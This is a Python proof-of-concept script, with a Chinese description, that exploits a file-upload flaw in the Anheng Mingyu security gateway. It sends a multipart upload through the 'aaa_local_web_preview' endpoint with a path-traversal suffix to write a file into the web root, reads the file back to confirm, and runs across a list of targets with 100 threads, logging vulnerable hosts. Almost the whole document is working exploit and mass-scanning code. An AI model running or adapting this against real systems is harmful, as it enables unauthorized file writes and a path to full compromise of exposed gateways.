import argparse
from multiprocessing.dummy import Pool
import requests

requests.packages.urllib3.disable_warnings()
import sys


def main():
    banner()
    paserse = argparse.ArgumentParser(description="安恒明御安全网关aaa_local_web_preview文件上传漏洞")
    paserse.add_argument('-u', '--url', help="please input your url")
    paserse.add_argument('-f', '--file', help="please input your file")
    args = paserse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as fp:
            fo = fp.readlines()
            url_list = []
            for i in fo:
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def banner():
    banner = """


                     /$$                                                                                /$$$$$$  /$$ /$$                                     /$$                           /$$
                    | $$                                                                               /$$__  $$|__/| $$                                    | $$                          | $$
  /$$$$$$  /$$$$$$$ | $$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$         /$$$$$$  /$$$$$$$  /$$   /$$      | $$  \__/ /$$| $$  /$$$$$$        /$$   /$$  /$$$$$$ | $$  /$$$$$$   /$$$$$$   /$$$$$$$
 |____  $$| $$__  $$| $$__  $$ /$$__  $$| $$__  $$ /$$__  $$       |____  $$| $$__  $$| $$  | $$      | $$$$    | $$| $$ /$$__  $$      | $$  | $$ /$$__  $$| $$ /$$__  $$ |____  $$ /$$__  $$
  /$$$$$$$| $$  \ $$| $$  \ $$| $$$$$$$$| $$  \ $$| $$  \ $$        /$$$$$$$| $$  \ $$| $$  | $$      | $$_/    | $$| $$| $$$$$$$$      | $$  | $$| $$  \ $$| $$| $$  \ $$  /$$$$$$$| $$  | $$
 /$$__  $$| $$  | $$| $$  | $$| $$_____/| $$  | $$| $$  | $$       /$$__  $$| $$  | $$| $$  | $$      | $$      | $$| $$| $$_____/      | $$  | $$| $$  | $$| $$| $$  | $$ /$$__  $$| $$  | $$
|  $$$$$$$| $$  | $$| $$  | $$|  $$$$$$$| $$  | $$|  $$$$$$$      |  $$$$$$$| $$  | $$|  $$$$$$$      | $$      | $$| $$|  $$$$$$$      |  $$$$$$/| $$$$$$$/| $$|  $$$$$$/|  $$$$$$$|  $$$$$$$
 \_______/|__/  |__/|__/  |__/ \_______/|__/  |__/ \____  $$       \_______/|__/  |__/ \____  $$      |__/      |__/|__/ \_______/       \______/ | $$____/ |__/ \______/  \_______/ \_______/
                                                   /$$  \ $$                           /$$  | $$                                                  | $$                                        
                                                  |  $$$$$$/                          |  $$$$$$/                                                  | $$                                        
                                                   \______/                            \______/                                                   |__/                                        





    """
    print(banner)


def poc(target):
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
    'Content-Type': 'multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a'
    }
    data = '''--849978f98abe41119122148e4aa65b1a\r\nContent-Disposition: form-data; name="123"; filename="test111.txt"\r\nContent-Type: text/plain\r\n\r\ntest\r\n--849978f98abe41119122148e4aa65b1a--'''
    url = target + '/webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../test111.txt'
    url1 = target + '/test111.txt'
    try:
        result = requests.post(url=url, timeout=5,headers=headers,data=data,verify=False,proxies=proxies).text
        if "success" in result:
            result1 = requests.get(url=url1,timeout=5,verify=False,).text
            if 'test' in result1:
                with open('resultanheng.txt', 'a') as fp1:
                    fp1.write(f'[+]{target} is veriable' + '\n')
            else:
                print(f'[-]{target} is not veriable')
    except:
        print(f'[*]{target} server error')


if __name__ == '__main__':
    main()